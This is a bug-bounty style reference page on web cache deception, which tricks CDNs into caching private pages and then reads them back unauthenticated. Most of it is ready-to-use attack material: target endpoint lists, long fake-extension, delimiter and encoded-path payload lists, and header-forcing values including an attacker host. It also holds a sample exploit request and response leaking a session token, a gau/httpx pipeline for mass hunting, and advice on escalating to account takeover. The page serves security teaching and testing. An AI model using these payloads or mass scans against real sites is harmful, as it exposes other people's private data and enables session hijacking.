---
tags:
  - Web
---

# :material-cached: Web Cache Deception

<span class="pill pill-medium">high impact</span> <span class="pill pill-info">web</span> <span class="pill pill-info">cdn</span>

Two attacks share the word "cache" and get mixed up constantly:

- **Cache deception** (this page) — you trick the cache into *storing a victim's private response* under a URL you control, then read it back unauthenticated. Nothing is injected; the cache simply files a dynamic page as if it were a static asset.
- **[Cache poisoning](web-cache-poisoning.md)** — you *inject malicious content* into a response that the cache then serves to everybody sharing that cache key.

Deception leaks data **out** of the cache. Poisoning pushes attacker content **in**.

*Technique set from "Mastering Web Cache Deception Vulnerabilities: An Advanced Bug Hunter's Guide" by [coffinxp](https://medium.com/@coffinxp).*

!!! abstract "TL;DR"
    Take a private endpoint (`/account`, `/profile`, `/settings`), glue something that *looks* static onto the end of it (`.css`, `;.js?test=123`, `%60.png?test=123`, `.json/*`), and check whether the CDN caches the response. If the victim loads that URL while authenticated, their session data sits in the shared cache for anyone who asks.

## :material-key-outline: Cache fundamentals & cache keys

A cache decides "have I seen this request before?" by building a **cache key**. That key is usually derived from:

- the full URL, including query parameters
- a handful of selected headers — `Host`, `User-Agent`, `Accept-Encoding`, etc.
- cookies, in some configurations

The bug lives in the gap between two components that parse the same URL differently. The CDN/reverse proxy looks at the URL and thinks "ends in `.css`, that's static, cache it for a day". The origin looks at the same URL, discards or ignores the suffix, and happily renders the authenticated `/account` page. The cache stores private HTML under a static-asset key.

Typical flow:

1. Target sits behind a CDN or reverse proxy (Cloudflare, Akamai, Fastly) that caches `.css`, `.js`, `.jpg` and friends.
2. Private pages exist that must never be cached — `/account`, `/profile`, `/settings`.
3. Attacker appends a fake static extension to the private endpoint:

```text
https://$TARGET/account/style.css
```

4. The cache sees `.css`, treats it as a static resource, stores the private page's HTML.
5. Anyone who requests that URL later — unauthenticated, incognito, whatever — gets the cached private content.

The first authenticated user to hit the poisoned URL is the one whose data leaks.

## :material-magnify-scan: Detecting the cache

Before hunting for confusion, prove a cache exists and learn how it announces itself. Watch these response headers:

| Header | What it tells you |
| --- | --- |
| `X-Cache` | `HIT` = served from cache, `MISS` = fetched from origin |
| `X-Cache-Hits` | Number of times this object has been served from cache |
| `X-Cache-Lookup` | Proxy-level cache lookup result (`HIT`/`MISS`) |
| `CF-Cache-Status` | Cloudflare's verdict — `HIT`, `MISS`, `DYNAMIC`, `BYPASS`, `EXPIRED` |
| `Age` | Seconds this response has been sitting in the cache — non-zero means cached |
| `Cache-Control` | `public, max-age=...` on a private page is the smoking gun |
| `Expires` / `Pragma` | Legacy cacheability directives |
| `Vary` | Which headers are part of the cache key |
| `ETag` / `Last-Modified` | Revalidation identity, often present on cached objects |
| `X-Served-By` / `X-Varnish` / `X-Proxy-Cache` | Which edge node/proxy answered |
| `X-Drupal-Cache` / `Akamai-Cache-Status` | Application- and CDN-specific cache state |

The one that matters for this bug: a **sensitive endpoint returning `HIT`**. Private pages should never be a hit for anyone but their owner.

### Cache-checker tooling

Online cache checkers such as **giftofspeed.com** parse the HTTP response for you and report caching behaviour. Feed it either the full URL with your candidate cache key, or just the base domain to enumerate which resources are currently cached.

The Burp extension does the grunt work in-scope:

- [Web Cache Deception Scanner (PortSwigger)](https://github.com/PortSwigger/web-cache-deception-scanner) — Burp extension that tests an application for WCD automatically.
- Practice: [PortSwigger Web Security Academy — Web cache deception](https://portswigger.net/web-security/web-cache-deception).

### Manual verification

- **Request/response analysis** — send the same request several times and diff the responses. Identical bytes plus a climbing `Age` means cached.
- **Cache busting** — append a unique parameter like `?v=123`. If the response changes, you moved to a new cache key and you're hitting the origin; if it doesn't, the parameter is unkeyed.
- **Timing analysis** — cached responses come back noticeably faster than origin round-trips.

```bash
curl -I https://$TARGET/account.css
```

## :material-target: Endpoints worth targeting

Anything user-specific. Start here:

```text
/account
/profile
/dashboard
/settings
/user
/admin
/private
/my-account
/user/profile
/dashboard/image
/dashboard/profile
/account/user
/address
/account/settings
/profile/edit
/user/settings
/admin/panel
/private/files
/my-account/orders
/user/details
/dashboard/reports
/account/profile
/account/info
/profile/view
/admin/settings
/private/data
/my-account/settings
/user/account
```

## :material-file-code: Extensions to append

Append each of these to a sensitive endpoint so it looks like a static resource:

```text
.css
.js
.svg
.asp
.aspx
.atom
.bak
.bin
.cgi
.csv
.do
.eot
.exe
.fake.js
.gif
.html
.ico
.jpg
.jpeg
.json
.jsp
.mp3
.mp4
.old
.pdf
.php
.png
.rss
.tar.gz
.tmp
.ttf
.txt
.webm
.woff
.woff2
.xml
.zip
.7z
```

Applied to dynamic endpoints:

```text
/dashboard.png
/user.js
/admin.css
/orders.jpg

# Try fake directories:
 /admin.css/login
 /account.js/test
 /settings/fake.js
 /orders/test/style.css
```

## :material-slash-forward: Encoded path traversal

URL encoding splits frontend and backend interpretation — the cache normalises one way, the origin another, and you end up with a cacheable path that resolves to sensitive data:

```text
https://$TARGET/settings/%2e%2e/images/logo.png  
https://$TARGET/admin/%2e%2e/scripts/app.js  
https://$TARGET/profile/%2e%2e/assets/styles.css  
https://$TARGET/billing/%2e%2e/fonts/main.woff  
https://$TARGET/api/v2/orders/%2e%2e/public/data.json  
https://$TARGET/user/%2e%2e/favicon.ico
```

## :material-link-variant-plus: Query-parameter cache keys

Plenty of CDNs key (or refuse to key) on query strings. Hang a static-looking extension off the path and add a throwaway parameter:

```text
js?test=123
.css?test=123
.jpeg?test=123
.jpg?test=123
.png?test=123
.gif?test=123
.woff?test=123
.woff2?test=123
.ttf?test=123
.otf?test=123
.svg?test=123
.html?test=123
.xml?test=123
.json?test=123
.mp4?test=123
.webm?test=123
.ico?test=123
.txt?test=123
.pdf?test=123
.doc?test=123
.xls?test=123
.ppt?test=123
.mp3?test=123
.ogg?test=123
.wav?test=123
.csv?test=123
.swf?test=123
.zip?test=123
.tar?test=123
.gz?test=123
.bz2?test=123
.7z?test=123
.webp?test=123
.bmp?test=123
.mpg?test=123
.avi?test=123
.mkv?test=123
.flv?test=123
.wmv?test=123
.ogg?test=123
.weba?test=123
.srt?test=123
.vtt?test=123
.rss?test=123
.atom?test=123
.webmanifest?test=123
.appcache?test=123
.ico?test=123
.jsonld?test=123
.webmanifest?test=123
.manifest?test=123
.yaml?test=123
.log?test=123
.jar?test=123
.webloc?test=123
.plist?test=123
.mpg2?test=123
.mk3d?test=123
.webm?test=123
.shtml?test=123
.xhtml?test=123
.phtml?test=123
.jsp?test=123
.aspx?test=123
.slim?test=123
.md?test=123
.txt?test=123
.woff?test=123
.woff2?test=123
.json?test=123
.map?test=123
.yml?test=123
.yaml?test=123
```

Examples:

```text
https://$TARGET/account?file=main.js  
https://$TARGET/settings?theme=dark.css  
https://$TARGET/user?resource=profile.jpg  
https://$TARGET/admin?view=dashboard.png  
https://$TARGET/api?callback=static.js
https://$TARGET/profile.js?test=123  
https://$TARGET/account.css?test=123  
https://$TARGET/settings.jpeg?test=123  
https://$TARGET/dashboard.jpg?test=123
```

## :material-code-braces: Delimiters & special characters

The characters that split "path" from "junk" differently in each parser:

```text
~
\/
\
;
:
//
/
..
.
_
-
@
?
=
#
##
!*
!
&
$
%5c
%3d
%2f
%2e
%26
%23
%20
%0a
%09
%00
```

Examples:

```text
https://$TARGET/account~style.css  
https://$TARGET/profile\/test.js  
https://$TARGET/settings\backup.jpg  
https://$TARGET/dashboard;v2.png  
https://$TARGET/user:data.css  
https://$TARGET/admin//panel.js  
https://$TARGET/private/../secret.css  
https://$TARGET/profile.edit.jpg  
https://$TARGET/user_name-test.gif  
https://$TARGET/account@cache.png  
https://$TARGET/profile?version=1.css  
https://$TARGET/settings=value.js  
https://$TARGET/dashboard#section.css  
https://$TARGET/user##details.js  
https://$TARGET/admin!*test.jpg  
https://$TARGET/private!cache.gif  
https://$TARGET/profile&token=123.css  
https://$TARGET/account$hidden.js  
https://$TARGET/settings%5cencoded.jpg  
https://$TARGET/dashboard%3dversion.css  
https://$TARGET/user%2ffile.js  
https://$TARGET/admin%2eedit.png  
https://$TARGET/private%26data.css  
https://$TARGET/profile%23hash.js  
https://$TARGET/account%20space.jpg  
https://$TARGET/settings%0anewline.css  
https://$TARGET/dashboard%09tab.js  
https://$TARGET/user%00nullbyte.png
```

### Semicolon before the extension

Path parameters (`;`) are the classic origin-vs-cache disagreement — many frameworks strip everything from `;` onward while the cache keeps it. Insert it immediately before the fake extension:

```text
;.js?test=123
;.css?test=123
;.jpeg?test=123
;.jpg?test=123
;.png?test=123
;.gif?test=123
;.woff?test=123
;.woff2?test=123
;.ttf?test=123
;.otf?test=123
;.svg?test=123
;.html?test=123
;.xml?test=123
;.json?test=123
;.mp4?test=123
;.webm?test=123
;.ico?test=123
;.txt?test=123
;.pdf?test=123
;.doc?test=123
;.xls?test=123
;.ppt?test=123
;.mp3?test=123
;.ogg?test=123
;.wav?test=123
;.csv?test=123
;.swf?test=123
;.zip?test=123
;.tar?test=123
;.gz?test=123
;.bz2?test=123
;.7z?test=123
;.webp?test=123
;.bmp?test=123
;.mpg?test=123
;.avi?test=123
;.mkv?test=123
;.flv?test=123
;.wmv?test=123
;.ogg?test=123
;.weba?test=123
;.srt?test=123
;.vtt?test=123
;.rss?test=123
;.atom?test=123
;.webmanifest?test=123
;.appcache?test=123
;.ico?test=123
;.jsonld?test=123
;.webmanifest?test=123
;.manifest?test=123
;.yaml?test=123
;.log?test=123
;.jar?test=123
;.webloc?test=123
;.plist?test=123
;.mpg2?test=123
;.mk3d?test=123
;.webm?test=123
;.shtml?test=123
;.xhtml?test=123
;.phtml?test=123
;.jsp?test=123
;.aspx?test=123
;.slim?test=123
;.md?test=123
;.txt?test=123
;.woff?test=123
;.woff2?test=123
;.json?test=123
;.map?test=123
;.yml?test=123
;.yaml?test=123
```

Examples:

```text
https://$TARGET/account;.js?test=123  
https://$TARGET/profile;.css?test=123  
https://$TARGET/settings;.jpeg?test=123  
https://$TARGET/dashboard;.jpg?test=123  
https://$TARGET/user;.png?test=123  
https://$TARGET/admin;.gif?test=123  
https://$TARGET/private;.woff?test=123  
https://$TARGET/account;.woff2?test=123  
https://$TARGET/profile;.ttf?test=123  
https://$TARGET/settings;.otf?test=123  
https://$TARGET/dashboard;.svg?test=123  
https://$TARGET/user;.html?test=123  
https://$TARGET/admin;.xml?test=123  
https://$TARGET/private;.json?test=123
```

### Encoded delimiter before the extension

Same idea, with an encoded backtick (`%60`) — the cache decodes it, the origin doesn't (or vice versa):

```text
%60.js?test=123
%60.css?test=123
%60.jpeg?test=123
%60.jpg?test=123
%60.png?test=123
%60.gif?test=123
%60.woff?test=123
%60.woff2?test=123
%60.ttf?test=123
%60.otf?test=123
%60.svg?test=123
%60.html?test=123
%60.xml?test=123
%60.json?test=123
%60.mp4?test=123
%60.webm?test=123
%60.ico?test=123
%60.txt?test=123
%60.pdf?test=123
%60.doc?test=123
%60.xls?test=123
%60.ppt?test=123
%60.mp3?test=123
%60.ogg?test=123
%60.wav?test=123
%60.csv?test=123
%60.swf?test=123
%60.zip?test=123
%60.tar?test=123
%60.gz?test=123
%60.bz2?test=123
%60.7z?test=123
%60.webp?test=123
%60.bmp?test=123
%60.mpg?test=123
%60.avi?test=123
%60.mkv?test=123
%60.flv?test=123
%60.wmv?test=123
%60.ogg?test=123
%60.weba?test=123
%60.srt?test=123
%60.vtt?test=123
%60.rss?test=123
%60.atom?test=123
%60.webmanifest?test=123
%60.appcache?test=123
%60.ico?test=123
%60.jsonld?test=123
%60.webmanifest?test=123
%60.manifest?test=123
%60.yaml?test=123
%60.log?test=123
%60.jar?test=123
%60.webloc?test=123
%60.plist?test=123
%60.mpg2?test=123
%60.mk3d?test=123
%60.webm?test=123
%60.shtml?test=123
%60.xhtml?test=123
%60.phtml?test=123
%60.jsp?test=123
%60.aspx?test=123
%60.slim?test=123
%60.md?test=123
%60.txt?test=123
%60.woff?test=123
%60.woff2?test=123
%60.json?test=123
%60.map?test=123
%60.yml?test=123
%60.yaml?test=123
```

Examples:

```text
https://$TARGET/account%60.js?test=123  
https://$TARGET/profile%60.css?test=123  
https://$TARGET/settings%60.jpeg?test=123  
https://$TARGET/dashboard%60.jpg?test=123  
https://$TARGET/user%60.png?test=123  
https://$TARGET/admin%60.gif?test=123  
https://$TARGET/private%60.woff?test=123  
https://$TARGET/account%60.woff2?test=123  
https://$TARGET/profile%60.ttf?test=123  
https://$TARGET/settings%60.otf?test=123  
https://$TARGET/dashboard%60.svg?test=123  
https://$TARGET/user%60.html?test=123  
https://$TARGET/admin%60.xml?test=123  
https://$TARGET/private%60.json?test=123
```

### Extension plus directory suffix

Fake extension followed by a directory-like tail — some caches match on "contains `.css/`", some origins route on the prefix:

```text
.js/*
.css/*
.jpeg/*
.jpg/*
.png/*
.gif/*
.woff/*
.woff2/*
.ttf/*
.otf/*
.svg/*
.html/*
.xml/*
.json/*
.mp4/*
.webm/*
.ico/*
.txt/*
.pdf/*
.doc/*
.xls/*
.ppt/*
.mp3/*
.ogg/*
.wav/*
.csv/*
.swf/*
.zip/*
.tar/*
.gz/*
.bz2/*
.7z/*
.webp/*
.bmp/*
.mpg/*
.avi/*
.mkv/*
.flv/*
.wmv/*
.ogg/*
.weba/*
.srt/*
.vtt/*
.rss/*
.atom/*
.webmanifest/*
.appcache/*
.ico/*
.jsonld/*
.webmanifest/*
.manifest/*
.yaml/*
.log/*
.jar/*
.webloc/*
.plist/*
.mpg2/*
.mk3d/*
.webm/*
.shtml/*
.xhtml/*
.phtml/*
.jsp/*
.aspx/*
.slim/*
.md/*
.txt/*
.woff/*
.woff2/*
.json/*
.map/*
.yml/*
.yaml/*
```

Examples:

```text
https://$TARGET/account.js/*  
https://$TARGET/profile.css/*  
https://$TARGET/settings.jpeg/*  
https://$TARGET/dashboard.jpg/*  
https://$TARGET/user.png/*  
https://$TARGET/admin.gif/*  
https://$TARGET/private.woff/*  
https://$TARGET/account.woff2/*  
https://$TARGET/profile.ttf/*  
https://$TARGET/settings.otf/*  
https://$TARGET/dashboard.svg/*  
https://$TARGET/user.html/*  
https://$TARGET/admin.xml/*  
https://$TARGET/private.json/*
```

## :material-format-list-checks: Header-based cache forcing

Some stacks let a header, rather than the path, decide what gets routed and keyed. Inject these and see whether the CDN files a dynamic response under a different, cacheable URL:

```http
X-Original-URL: /admin/
X-Rewrite-URL: /profile/
X-Forwarded-Host: attacker.com
X-Forwarded-Path: /static.css
```

Whether this lands depends entirely on how the CDN, proxy, and origin were wired together — the same headers are the bread and butter of [Host header attacks](host-header.md) and [403 bypasses](403-bypass.md).

## :material-console: Exploit example

Request:

```http
GET /account.php/poc.css HTTP/1.1
Host: vulnerable-example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cache-Control: no-cache
```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 11 Aug 2025 09:40:18 GMT
Content-Type: text/css
Content-Length: 412
Cache-Control: public, max-age=86400
X-Cache: HIT

/* Cached response exposing sensitive data */
body { background-color: #fff; }

/* Attacker view */
username: johndoe@example.com
email: johndoe@example.com
session_token: 9f73b21d2e934f6e4cbdc8d83c4e9210
```

The origin executes `/account.php` as a PHP script and shrugs off the `/poc.css` suffix. The CDN only sees `.css`, stores the rendered private page as a static file with a one-day TTL, and hands it to the next visitor with no authentication at all.

!!! loot "The `session_token` in the body is the finding"
    A leaked session token turns an information disclosure into full account takeover. Grab whatever the page renders — email, address, order history, CSRF tokens, API keys — and show the escalation in the report.

## :material-clipboard-check: Confirmation workflow

```text
1. Identify private endpoint
2. Append static-like extension
3. Test caching with GiftOfSpeed or curl:
   curl -I https://$TARGET/account.css
4. Look for cache hit headers
5. Verify sensitive content exposure
6. Try multiple variations for bypass
```

The verification that actually convinces a triager: log in as user A, load the crafted URL once, then open the same URL in a fresh incognito window with no cookies and screenshot user A's data coming back.

## :material-rocket-launch: Mass hunting

Pull historical URLs, filter to sensitive paths, bolt a fake stylesheet on the end, and probe for live 200s:

```bash
gau target.com | grep -E '/(account|profile|dashboard|settings|user|admin|private|my-account|user/profile|dashboard/image|dashboard/profile|account/user|address|account/settings|profile/edit|user/settings|admin/panel|private/files|my-account/orders|user/details|dashboard/reports|account/profile|account/info|profile/view|admin/settings|private/data|my-account/settings|user/account)(\?|/|$)' > urls.txt

cat urls.txt | while read url; do echo "$url/style.css"; done | httpx-toolkit -mc 200 -title -cl
```

`gau` collects the URL corpus, the regex keeps only user-specific paths, the loop appends `/style.css` to each, and `httpx-toolkit -mc 200 -title -cl` reports which of them answer with a real page (title and content-length included so you can eyeball what came back).

## :material-file-document-outline: Patterns seen in the wild

!!! bug "Profile page, cached by extension"
    `/user/profile` rendered sensitive account data. Appending `.css` gave `/user/profile.css`; after logging out and reloading that URL in incognito, the same profile data came back. The CDN was caching purely on file extension while the backend kept treating it as a profile request.

!!! bug "API endpoint, cached by query parameter"
    `/api/user/data` returned per-user JSON. Adding a static-looking parameter — `/api/user/data?callback=static.js` — made the CDN cache it, and the user data was retrievable with no authentication. The cache rule keyed on the presence of specific query parameters and ignored that the response was dynamic.

## :material-alert-octagon: Impact

- Exposure of personal information
- Session hijacking
- Authentication bypass
- Complete account takeover

Severity scales with what the private page renders and how long the TTL is — a `max-age=86400` on a page containing a session token is a day-long window for anyone who guesses the URL.

## :material-link-variant: Related

- The other half of the cache attack surface → [Web Cache Poisoning](web-cache-poisoning.md).
- Header tricks that overlap heavily with the forcing section → [Host Header Injection](host-header.md).
- What to do with the data you pull out of the cache → [Information Leakage](info-leakage.md).
- Repeater, Param Miner, and the WCD scanner extension → [Burp](../toolbox/burp.md).
- Reference: [PortSwigger Web cache deception](https://portswigger.net/web-security/web-cache-deception), [web-cache-deception-scanner](https://github.com/PortSwigger/web-cache-deception-scanner).
